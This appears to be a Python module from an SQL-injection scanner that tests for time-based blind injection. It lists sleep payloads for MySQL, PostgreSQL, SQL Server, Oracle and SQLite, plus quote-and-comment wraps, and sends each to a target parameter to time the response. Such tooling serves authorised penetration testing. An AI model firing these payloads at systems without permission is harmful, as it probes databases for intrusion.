"""Time-based blind detection: inject a delay and measure response time."""
from sqldark.techniques import Technique, Result

DELAY = 5  # seconds

# DBMS-specific sleep payloads. {d} = delay seconds
VECTORS = [
    ("MySQL", "{p} AND SLEEP({d}){s}"),
    ("MySQL", "{p} AND (SELECT 1 FROM (SELECT SLEEP({d}))a){s}"),
    ("PostgreSQL", "{p} AND (SELECT pg_sleep({d})){s}"),
    ("Microsoft SQL Server", "{p}; WAITFOR DELAY '0:0:{d}'{s}"),
    ("Microsoft SQL Server", "{p} WAITFOR DELAY '0:0:{d}'{s}"),
    ("Oracle", "{p} AND DBMS_PIPE.RECEIVE_MESSAGE('a',{d})=1{s}"),
    ("SQLite", "{p} AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({big})))){s}"),
]

WRAPS = [("", ""), ("'", "-- -"), ("\"", "-- -"), (")", "-- -"), ("')", "-- -")]


class TimeBlind(Technique):
    name = "time-based blind"
    letter = "T"

    def test(self, point, baseline):
        base_time = min(baseline.elapsed, self._quick_base(point))
        threshold = max(base_time + DELAY - 1.5, DELAY - 1.0)

        for dbms, tmpl in VECTORS:
            for prefix, suffix in WRAPS:
                payload = tmpl.format(p=prefix, s=suffix, d=DELAY, big=300000000)
                resp = self._send(point, payload)
                if resp.elapsed >= threshold:
                    # Confirm it is the injection, not a fluke: resend with 0 delay
                    confirm = tmpl.format(p=prefix, s=suffix, d=0, big=1)
                    cresp = self._send(point, confirm)
                    if cresp.elapsed < threshold - 1:
                        self.log.ok(
                            f"time-blind: {dbms} delayed {resp.elapsed:.1f}s "
                            f"(base {base_time:.1f}s) [{prefix!r}..{suffix!r}]")
                        return Result(self.name, point, vulnerable=True,
                                      payload=payload, dbms=dbms,
                                      detail={"elapsed": round(resp.elapsed, 2),
                                              "baseline": round(base_time, 2)},
                                      confidence=0.9)
        return Result(self.name, point)

    def _quick_base(self, point):
        r = self._send(point, " ")
        return r.elapsed if r.elapsed > 0 else 0.3
